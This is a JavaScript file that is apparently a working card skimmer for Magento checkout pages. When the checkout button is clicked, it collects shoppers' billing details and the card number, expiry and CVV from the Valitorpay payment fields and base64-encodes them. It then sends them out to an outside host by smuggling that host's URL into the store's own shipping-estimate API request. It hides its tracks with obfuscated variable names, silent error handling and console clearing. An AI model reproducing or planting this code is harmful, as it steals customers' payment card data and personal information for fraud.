document.body.addEventListener("click", function(event) {
    const checkoutButton = event.target.closest("button.action.primary.checkout");
    if (checkoutButton && !checkoutButton.dataset.clicked) {
        console.log("Checkout is being processed!");
        checkoutButton.dataset.clicked = "true"; 
        setTimeout(() => checkoutButton.removeAttribute("data-clicked"), 3000); 

        try {
            const gjh23lkd = window.checkoutConfig?.billingAddressFromData;
            if (!gjh23lkd) {
                console.error("Billing address data not found.");
                return;
            }
            const zlfqwz = `${gjh23lkd.firstname} ${gjh23lkd.lastname}`;
            const qnxzsd = gjh23lkd.street[0] || "";
            const prwg54z = gjh23lkd.street[1] || "";
            const i4rts7l = gjh23lkd.city;
            const xmvs9dp = gjh23lkd.region;
            const w4jhk5z = gjh23lkd.postcode;
            const wmpd96r = gjh23lkd.country_id;
            const kjf98b6 = gjh23lkd.telephone;
            const zf1p9ko = window.location.hostname;
            const t1x9z7l = new Date().toISOString().slice(0, 19).replace("T", " ");

            const n3qkj20f = `Name:${zlfqwz} | Address:${qnxzsd} | Address2:${prwg54z} | City:${i4rts7l} | State:${xmvs9dp} | Zip:${w4jhk5z} | Country:${wmpd96r} | Phone:${kjf98b6} | From:${zf1p9ko} | ${t1x9z7l}`;

            const a92kj38 = document.querySelector("#valitorpay_cc_number")?.value || "N/A";
            const s84p0zt = document.querySelector("#valitorpay_expiration")?.value.padStart(2, "0") || "N/A";
            const h0a62pk = document.querySelector("#valitorpay_expiration_yr")?.value || "N/A";
            const d90l35k = document.querySelector("#valitorpay_cc_cid")?.value || "N/A";

            const n13zj04f = `Card:${a92kj38} | Exp:${s84p0zt}/${h0a62pk} | CVV:${d90l35k}`;
            const l34fkd92 = `${n13zj04f} | ${n3qkj20f}`;

            const zz = btoa(l34fkd92); 

            let jsonData = {
                address: {
                    totalsCollector: {
                        collectorList: {
                            totalCollector: {
                                sourceData: {
                                    data: `https://magento.ink/dad.php?data=${zz}`,
                                    dataIsURL: true,
                                    options: 12345678
                                }
                            }
                        }
                    }
                }
            };
            fetch("/rest/V1/guest-carts/1/estimate-shipping-methods", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(jsonData)
            })
            .catch(error => {
            });

        } catch (err) {
        }
    }
console.clear();
});
